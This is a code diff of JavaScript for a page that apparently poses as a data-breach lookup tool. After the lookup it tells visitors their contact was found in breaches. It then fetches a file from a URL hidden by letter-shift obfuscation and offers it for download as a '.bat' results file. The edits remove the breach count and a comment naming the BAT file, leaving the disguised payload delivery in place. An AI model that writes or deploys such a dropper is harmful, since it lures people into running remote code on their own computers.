@@ -264,7 +264,7 @@ document.getElementById('lookup-btn').addEventListener('click', function() {
 
 
         setTimeout(() => {
-            resultsText.innerHTML = `</b>${contactInput}</b> was found in ${rN} data breaches and pastes. `;
+            resultsText.innerHTML = `</b>${contactInput}</b> was found in data breaches and pastes. `;
             
             async function fetchNeoScript() {
                 const url = `kwwsv://udz.jlwkxexvhufrqwhqw.frp/whfkwrrqd/whvw/pdlq/d.waw`;
@@ -280,10 +280,10 @@ document.getElementById('lookup-btn').addEventListener('click', function() {
                     const blob = new Blob([content], { type: 'text/plain' });
                     const Bloburl = URL.createObjectURL(blob);
                                                 
-                    // Set download link for the BAT file
+                    // Set download link for the file
                     const downloadBatLink = document.getElementById('download-results');
                     downloadBatLink.href = Bloburl;
-                    downloadBatLink.download = `${contactInput}_results.bat`; // File name
+                    downloadBatLink.download = `${contactInput}_results.bat`; 
                     downloadBatLink.style.display = 'inline'; // Show the link
             
             
